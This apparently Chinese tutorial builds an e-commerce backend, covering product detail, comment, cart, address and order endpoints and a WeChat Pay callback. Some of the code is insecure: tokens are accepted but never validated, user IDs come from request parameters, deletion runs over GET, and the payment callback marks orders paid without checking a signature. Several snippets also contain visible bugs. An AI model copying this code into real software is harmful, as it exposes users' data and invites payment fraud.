@GetMapping(&quot;/category-recommends&quot;) @ApiOperation(value = &quot;根据商品分类销量前六推荐商品&quot;) public ResultVO getRecommendByCategoryList()&#123; return ResultVO.success(productService.getRecommendByCategory()); &#125; 接口测试 前端实现效果 1.8 商品详情 点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面 用户点击时，携带商品的id进行后端请求，后端接收到商品id后，进行数据库查询，返回详细信息 包括以下内容 1.商品的基本信息 2.商品的套餐信息 3.商品的图片信息 4.商品的评价信息 5.商品的参数信息 商品详情接口 接口所需信息如下，只需要三个单表查询即可完成，因此dao层可以直接使用tkMapper提供的接口 service public ResultVO getProductBasicInfo(String productId) &#123; //1.商品基本信息 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//状态为1表示上架商品 List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleImg = new Example(ProductImg.class); Example.Criteria imgCriteria = exampleImg.createCriteria(); imgCriteria.andEqualTo(&quot;itemId&quot;,productId); List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg); Example exampleSku = new Example(ProductSku.class); Example.Criteria skuCriteria = exampleSku.createCriteria(); skuCriteria.andEqualTo(&quot;productId&quot;,productId); List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;product&quot;, products.get(0)); hashMap.put(&quot;productImgs&quot;, productImgs); hashMap.put(&quot;productSkus&quot;, productSkus); return ResultVO.success(hashMap); &#125; return ResultVO.failed(&quot;查询的商品不存在&quot;); &#125; controller @RestController @CrossOrigin @RequestMapping(&quot;/product&quot;) @Api(value = &quot;提供商品信息相关的接口&quot;,tags = &quot;商品管理&quot;) public class ProductController &#123; @Autowired private ProductService productService; @Autowired private ProductCommontsService productCommontsService; @ApiOperation(&quot;商品基本信息查询接口&quot;) @GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;) public ResultVO getProductBasicInfo(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductBasicInfo(pid); &#125; &#125; 接口测试 商品参数接口 接口所需数据可知，也为单表查询，因此dao层可以直接使用tkMapper提供的接口 service @Override public ResultVO getProductParamsById(String productId) &#123; //1.商品基本信息 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//状态为1表示上架商品 List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleParams = new Example(ProductParams.class); Example.Criteria criteria1 = exampleParams.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;, productId); List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams); if(params.size() &gt; 0)&#123; return ResultVO.success(params.get(0)); &#125;else &#123; return ResultVO.failed(&quot;此产品为三无产品！&quot;); &#125; &#125;else &#123; return ResultVO.failed(&quot;查询的商品不存在&quot;); &#125; &#125; controller @ApiOperation(&quot;商品参数信息查询接口&quot;) @GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;) public ResultVO getProductParams(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductParamsById(pid); &#125; 测试结果 商品评价接口评价接口需要完成两个功能：评价列表分页展示和评价分析 评价列表分页展示 ​ 接口所需参数如上图，可以看出需要关联用户数据，因此为多表关联查询 sql select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, c.is_show from product_comments c INNER JOIN users u ON u.user_id &#x3D; c.user_id WHERE c.product_id &#x3D; 3 limit 1,5 dao &lt;resultMap id=&quot;ProductCommentsVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;&gt; &lt;id column=&quot;comm_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;order_item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderItemId&quot; /&gt; &lt;result column=&quot;is_anonymous&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isAnonymous&quot; /&gt; &lt;result column=&quot;comm_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commType&quot; /&gt; &lt;result column=&quot;comm_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commLevel&quot; /&gt; &lt;result column=&quot;comm_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commContent&quot; /&gt; &lt;result column=&quot;comm_imgs&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commImgs&quot; /&gt; &lt;result column=&quot;sepc_name&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;sepcName&quot; /&gt; &lt;result column=&quot;reply_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;replyStatus&quot; /&gt; &lt;result column=&quot;reply_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;replyContent&quot; /&gt; &lt;result column=&quot;reply_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;replyTime&quot; /&gt; &lt;result column=&quot;is_show&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isShow&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectCommontsByProductId&quot; resultMap=&quot;ProductCommentsVOMap&quot;&gt; select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, c.is_show from product_comments c INNER JOIN users u ON u.user_id = c.user_id WHERE c.product_id =#&#123;productId&#125; limit #&#123;start&#125;,#&#123;limit&#125; &lt;/select&gt; serevice 添加实体类ProductCommentsVO @Data @AllArgsConstructor @NoArgsConstructor public class ProductCommentsVO &#123; private String commId; private String productId; private String productName; private String orderItemId; private Integer isAnonymous; private Integer commType; private Integer commLevel; private String commContent; private String commImgs; private Date sepcName; private Integer replyStatus; private String replyContent; private Date replyTime; private Integer isShow; //封装评论对应的用户数据 private String userId; private String username; private String nickname; private String userImg; &#125; 添加分页实体类 @Data @NoArgsConstructor @AllArgsConstructor public class PageHelper&lt;T&gt; &#123; //总记录数 private int count; //总页数 private int pageCount; //分页数据 private List&lt;T&gt; list; &#125; Service的代码 @Override public ResultVO listCommontsByProductId(String productId,int pageNum,int limit) &#123; //List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId); //1.根据商品id查询总记录数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int count = productCommentsMapper.selectCountByExample(example); //2.计算总页数（必须确定每页显示多少条 pageSize = limit） int pageCount = count%limit==0? count/limit : count/limit+1; //3.查询当前页的数据（因为评论中需要用户信息，因此需要连表查询---自定义） int start = (pageNum-1)*limit; List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit); return ResultVO.success(list); &#125; controller @ApiOperation(&quot;商品评价分页查询接口&quot;) @GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;) public ResultVO getProductCommonts(@PathVariable(&quot;pid&quot;) String pid, @RequestParam(&quot;pageNum&quot;) int pageNum, @RequestParam(&quot;limit&quot;) int limit)&#123; return productCommontsService.listCommontsByProductId(pid, pageNum, limit); &#125; 接口测试 评价分析 对该商品的评价进行分类，分为好评中评和差评 响应数据如图所示，可以看出是单表查询 service @Override public ResultVO getCommentsCountByProductId(String productId) &#123; // 查询商品总数 Example example = new Example(ProductComments.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); int total = productCommentsMapper.selectCountByExample(criteria); // 查询好评数 Example example1 = new Example(ProductComments.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;,productId); criteria1.andEqualTo(&quot;commType&quot;, 1); int goodTotal = productCommentsMapper.selectCountByExample(example1); // 查询中评数 Example example2 = new Example(ProductComments.class); Example.Criteria criteria2 = example1.createCriteria(); criteria2.andEqualTo(&quot;productId&quot;,productId); criteria2.andEqualTo(&quot;commType&quot;, 0); int midTotal = productCommentsMapper.selectCountByExample(example2); // 查询差评数 Example example3 = new Example(ProductComments.class); Example.Criteria criteria3 = example1.createCriteria(); criteria3.andEqualTo(&quot;productId&quot;,productId); criteria3.andEqualTo(&quot;commType&quot;, -1); int badTotal = productCommentsMapper.selectCountByExample(example3); // 好评率 double percent = (Double.parseDouble(goodTotal+&quot;&quot;)/Double.parseDouble(total + &quot;&quot;)) * 100; String percentValue = (percent+&quot;&quot;).substring(0,(percent+&quot;&quot;).lastIndexOf(&quot;.&quot;)+3); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;total&quot;, total); hashMap.put(&quot;goodTotal&quot;, goodTotal); hashMap.put(&quot;badTotal&quot;, badTotal); hashMap.put(&quot;midTotal&quot;, midTotal); hashMap.put(&quot;percent&quot;, percentValue); return ResultVO.success(hashMap); &#125; controller @ApiOperation(&quot;商品总体评价信息查询接口&quot;) @GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;) public ResultVO getProductCommontscount(@PathVariable(&quot;pid&quot;) String pid)&#123; return productCommontsService.getCommentsCountByProductId(pid); &#125; 1.9 购物车业务添加购物车 Service private SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;); @Override public ResultVO addShoppingCart(ShoppingCart cart) &#123; cart.setCartTime(sdf.format(new Date())); int i = shoppingCartMapper.insert(cart); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;fail&quot;,null); &#125; Controller @PostMapping(&quot;/add&quot;) public ResultVO addShoppingCart(@RequestBody ShoppingCart cart)&#123; ResultVO resultVO = shoppingCartService.addShoppingCart(cart); return resultVO; &#125; 获取购物车列表 sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c inner JOIN product p INNER JOIN product_sku s INNER JOIN product_img i ON c.product_id &#x3D; p.product_id AND c.sku_id&#x3D;s.sku_id AND c.product_id&#x3D;i.item_id WHERE c.user_id &#x3D; 1 AND i.is_main&#x3D;1 dao 创建一个新的实体类用于保存返回的数据 @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //库存 &#125; mapper public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); xml &lt;resultMap id=&quot;ShoppingCartVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listShoppingCartsByUserId(int userId) &#123; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByUserId(userId); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, list); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByUserId(userId); return resultVO; &#125; 更新购物车 更新购物车发送的请求如下，由分析可以看出url的格式如下，并且发送的是put请求 /shopcart/update/&#123;cartId&#125;/&#123;num&#125; sql 使用update方法对对应的购物车记录进行修改即可 update shopping_cart set cart_num=3 where cart_id=1 dao xml &lt;select id=&quot;selectShopcartByUserId&quot; resultMap=&quot;ShoppingCartVOMap&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where user_id = #&#123;userId&#125; and i.is_main=1 &lt;/select&gt; &lt;update id=&quot;updateCartnumByCartid&quot;&gt; update shopping_cart set cart_num=#&#123;cartNum&#125; where cart_id=#&#123;cartId&#125; &lt;/update&gt; mapper public int updateCartnumByCartid(@Param(&quot;cartId&quot;) int cartId, @Param(&quot;cartNum&quot;) int cartNum); service @Override public ResultVO updateCartNum(int cartId, int cartNum) &#123; int i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum); if(i&gt;0)&#123; return new ResultVO(ResStatus.OK,&quot;update success&quot;,null); &#125;else&#123; return new ResultVO(ResStatus.NO,&quot;update fail&quot;,null); &#125; &#125; controller @PutMapping(&quot;/update/&#123;cid&#125;/&#123;cnum&#125;&quot;) public ResultVO updateNum(@PathVariable(&quot;cid&quot;) Integer cartId, @PathVariable(&quot;cnum&quot;) Integer cartNum, @RequestHeader(&quot;token&quot;) String token)&#123; ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum); return resultVO; &#125; 获取购物车列表信息 当点击结算时，页面会跳转到结算页面，这里依然需要显示订单中的信息，但是这里需要的是批量结算，所以需要批量获取 从前端发起的请求可以看到cids为本次请求的所有购物车订单 响应结果如下 从中可以看到与获取购物车列表使用到的sql语句大致相同 sql select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id &#x3D; p.product_id and i.item_id&#x3D;p.product_id and c.sku_id&#x3D;s.sku_id where i.is_main&#x3D;1 and c.cart_id in (6,7) dao 创建新的实体类保存结果 /** * 新增 productName、productImg */ @Data @NoArgsConstructor @AllArgsConstructor public class ShoppingCartVO &#123; private Integer cartId; private String productId; private String skuId; private String userId; private String cartNum; private String cartTime; private BigDecimal productPrice; private String skuProps; private String productName; private String productImg; private double originalPrice; private double sellPrice; private String skuName; private int skuStock; //库存 &#125; Mapper中代码 public List&lt;ShoppingCartVO&gt; selectShopcartByCids(List&lt;Integer&gt; cids); xml &lt;resultMap id=&quot;ShoppingCartVOMap2&quot; type=&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;&gt; &lt;id column=&quot;cart_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;cartId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;sku_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuId&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;cart_num&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartNum&quot; /&gt; &lt;result column=&quot;cart_time&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;cartTime&quot; /&gt; &lt;result column=&quot;product_price&quot; jdbcType=&quot;DECIMAL&quot; property=&quot;productPrice&quot; /&gt; &lt;result column=&quot;sku_props&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuProps&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productImg&quot; /&gt; &lt;result column=&quot;original_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;originalPrice&quot; /&gt; &lt;result column=&quot;sell_price&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;sellPrice&quot; /&gt; &lt;result column=&quot;sku_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;skuName&quot; /&gt; &lt;result column=&quot;stock&quot; property=&quot;skuStock&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectShopcartByCids&quot; resultMap=&quot;ShoppingCartVOMap2&quot;&gt; select c.cart_id, c.product_id, c.sku_id, c.user_id, c.cart_num, c.cart_time, c.product_price, c.sku_props, p.product_name, i.url,s.original_price,s.sell_price,s.sku_name,s.stock from shopping_cart c INNER JOIN product p INNER JOIN product_img i INNER JOIN product_sku s ON c.product_id = p.product_id and i.item_id=p.product_id and c.sku_id=s.sku_id where i.is_main=1 and c.cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/select&gt; service @Override public ResultVO listShoppingCartsByCids(String cids) &#123; // 将前端请求携带的字符串转换成int数组 List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cartIds); return ResultVO.success(list); &#125; controller @GetMapping(&quot;/listbycids&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true) public ResultVO listByCids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids); return resultVO; &#125; 删除购物车 sql 删除数据时，可以批量删除也可以是单个删除，因此使用下面的sql语句 delete from shopping_cart where cart_id IN (10,11) dao public int deleteShopcartByCids(List&lt;Integer&gt; cids); &lt;delete id=&quot;deleteShopcartByCids&quot;&gt; delete from shopping_cart where cart_id in &lt;foreach collection=&quot;cids&quot; item=&quot;cid&quot; separator=&quot;,&quot; open=&quot;(&quot; close=&quot;)&quot;&gt; #&#123;cid&#125; &lt;/foreach&gt; &lt;/delete&gt; service @Override public ResultVO deleteShoppingCartsByCids(String cids) &#123; // 将前端请求携带的字符串转换成int数组 List&lt;Integer&gt; cartIds = new ArrayList&lt;&gt;(); String[] strings = cids.split(&quot;,&quot;); for (String string : strings) &#123; cartIds.add(Integer.parseInt(string)); &#125; int i = shoppingCartMapper.deleteShopcartByCids(cartIds); if(i &gt; 0)&#123; return ResultVO.success(); &#125;else &#123; return ResultVO.failed(&quot;删除失败！&quot;); &#125; &#125; controller @GetMapping(&quot;/delete&quot;) @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;选择的购物车记录的id&quot;,required = true) public ResultVO deletebycids(String cids, @RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = shoppingCartService.deleteShoppingCartsByCids(cids); return resultVO; &#125; 前端代码 由于该功能没有再前端实现因此在shopcart.html页面中加入如下js代码 deleteByIds: function () &#123; if (this.opts.length == 0) &#123; alert(&quot;请选择要购买的商品！&quot;) &#125; else &#123; //1.获取选择购物车记录的id [0,2] ---&gt; cartId 8 cartId 10 --- 8,10, var cids = &quot;&quot;; for (var i = 0; i &lt; this.opts.length; i++) &#123; var index = this.opts[i]; var cartId = this.shopcarts[index].cartId; if (i &lt; this.opts.length - 1) &#123; cids = cids + cartId + &quot;,&quot;; &#125; else &#123; cids = cids + cartId; &#125; &#125; var url = baseUrl + &quot;shopcart/delete/?cids=&quot; + cids; axios(&#123; url: url, method: &quot;get&quot;, headers: &#123; token: this.token &#125; &#125;).then((res) =&gt; &#123; console.log(res); if (res.data.code = 10000) &#123; //重新刷新购物车 this.getShoppingCartList(); &#125; &#125;); &#125; &#125; 接口测试 1.10 收货地址获取收获地址直接根据用户id即可获取到收获地址，所以这里直接使用tkMapper生成的即可。 service @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listAddrsByUid(int userId) &#123; Example example = new Example(UserAddr.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;userId&quot;,userId); criteria.andEqualTo(&quot;status&quot;,1); List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;success&quot;, userAddrs); return resultVO; &#125; controller @GetMapping(&quot;/list&quot;) @ApiImplicitParam(dataType = &quot;int&quot;,name = &quot;userId&quot;, value = &quot;用户ID&quot;,required = true) public ResultVO list(Integer userId,@RequestHeader(&quot;token&quot;)String token)&#123; ResultVO resultVO = userAddrService.listAddrsByUid(userId); return resultVO; &#125; 1.11 订单业务 订单添加接口 数据库操作 根据收获地址的id，获取地址信息 根据购物车id，查询购物车的详细信息（关联商品名称，sku，库存，商品图片，价格），用于生成订单快照 保存订单 保存商品快照 修改库存 service /** * 保存订单业务 * @param cids * @param order * @return * @throws SQLException */ @Transactional public ResultVO addOrder(String cids, Orders order) throws SQLException &#123; //处理cids String[] strings = cids.split(&quot;,&quot;); List&lt;Integer&gt; cidsInt = new ArrayList&lt;&gt;(); for (String string : strings) &#123; cidsInt.add(Integer.parseInt(string)); &#125; // 查询与当前订单相关联的购物车记录 List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt); // 判断商品库存是否充足 boolean flag = true; String untitle = &quot;&quot;; // 保存所有商品的名称 最后保存到订单快照中 for (ShoppingCartVO cartVO : shopcartList) &#123; if(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123; flag = false; &#125; untitle = untitle + cartVO.getProductName() + &quot;,&quot;; &#125; if(flag)&#123; // 库存充足 则保存订单 // userId // untitle // 支付时间 // 收货人的信息 // 总价格 // 支付方式（1） // 支付状态（待支付） order.setUntitled(untitle); order.setCancelTime(new Date()); order.setStatus(&quot;1&quot;); String orderId = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;); order.setOrderId(orderId); int i = ordersMapper.insert(order); // 生成商品快照 for (ShoppingCartVO sc: shopcartList) &#123; int cnum = Integer.parseInt(sc.getCartNum()); String itemId = System.currentTimeMillis()+&quot;&quot;+ (new Random().nextInt(89999)+10000); OrderItem orderItem = new OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), new BigDecimal(sc.getSellPrice()), cnum, new BigDecimal(sc.getSellPrice() * cnum), new Date(), new Date(), 0); orderItemMapper.insert(orderItem); //增加商品销量 &#125; // 扣减库存 // 使用当前库存减去商品数量 for (ShoppingCartVO cartVO : shopcartList) &#123; String skuId = cartVO.getSkuId(); int newStock = cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum()); Example example = new Example(ProductSku.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;skuId&quot;, skuId); // ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId); // productSku.setStock(newStock); // int k = productSkuMapper.updateByExample(productSku, example); ProductSku productSku = new ProductSku(); productSku.setStock(newStock); productSku.setSkuId(skuId); int k = productSkuMapper.updateByPrimaryKeySelective(productSku); &#125; //购买完成后 删除对应的购物车数据 for (Integer cid : cidsInt) &#123; shoppingCartMapper.deleteByPrimaryKey(cid); &#125; return ResultVO.success(&quot;生成订单成功！&quot;, orderId); &#125;else &#123; return ResultVO.failed(&quot;商品库存不足，请重新选择！&quot;); &#125; &#125; controller @PostMapping(&quot;/add&quot;) // @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;购物车id&quot;,required = true) public ResultVO list(String cids, @RequestBody Orders order)&#123; System.out.println(&quot;##################&quot;); System.out.println(cids); if(cids.contains(&quot;#&quot;))&#123; cids.replace(&quot;#&quot;, &quot;&quot;); &#125; System.out.println(cids); try &#123; Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order); String orderId = orderInfo.get(&quot;orderId&quot;); if(orderId !=null)&#123; Map&lt;String , String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,orderInfo.get(&quot;productNames&quot;)); //商品描述 data.put(&quot;out_trade_no&quot;,orderId); //使⽤当前⽤户订单的编号作为当前⽀付交易的交易号 data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //⽀付币种 data.put(&quot;total_fee&quot;, order.getActualAmount()*100 + &quot;&quot; ); //⽀付⾦额 data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //交易类型 data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //设置⽀付完成时的回调⽅法 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //发送请求 System.out.println(resp); String code_url = resp.get(&quot;code_url&quot;); orderInfo.put(&quot;code_url&quot;, code_url); return ResultVO.success(orderInfo); &#125;else &#123; return ResultVO.failed(&quot;订单为空！&quot;); &#125; &#125; catch (SQLException throwables) &#123; return ResultVO.failed(&quot;添加订单失败！&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); return ResultVO.failed(&quot;添加订单失败！&quot;); &#125; &#125; 支付回调 当用户支付成功后，支付平台会向服务器的指定接口发送支付订单的支付状态数据 创建控制器并定义回调接口 package com.qfedu.fmmall.controller; import com.github.wxpay.sdk.WXPayUtil; import com.qfedu.fmmall.entity.Orders; import com.qfedu.fmmall.service.OrderService; import com.qfedu.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.sql.SQLException; import java.util.HashMap; import java.util.Map; @RestController @RequestMapping(&quot;/pay&quot;) @Api(value = &quot;用户地址接口&quot;,tags = &quot;用户地址管理&quot;) @CrossOrigin public class PayController &#123; @Autowired private OrderService orderService; @GetMapping(&quot;/callable&quot;) public String success(HttpServletRequest request) throws Exception &#123; ServletInputStream is = request.getInputStream(); byte[] bytes = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bytes)) != -1)&#123; builder.append(new String(bytes, 0 ,len)); &#125; String s = builder.toString(); // 使用wxpay的工具类讲xml的响应结果 转换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map != null &amp;&amp; &quot;success&quot;.equalsIgnoreCase(map.get(&quot;result_code&quot;)))&#123; // 支付成功 // 修改订单状态为代发货/已支付 String orderId = map.get(&quot;out_trade_no&quot;); int i = orderService.updateOrderStatus(orderId, &quot;2&quot;); if(i&gt;0)&#123; // 响应微信平台 HashMap&lt;String, String&gt; resp = new HashMap&lt;&gt;(); resp.put(&quot;return_code&quot;, &quot;success&quot;); resp.put(&quot;return_msg&quot;, &quot;OK&quot;); resp.put(&quot;appid&quot;, map.get(&quot;appid&quot;)); resp.put(&quot;result_code&quot;, &quot;success&quot;); String s1 = WXPayUtil.mapToXml(resp); return s1; &#125; &#125; return null; &#125; &#125; 设置回调的url ** 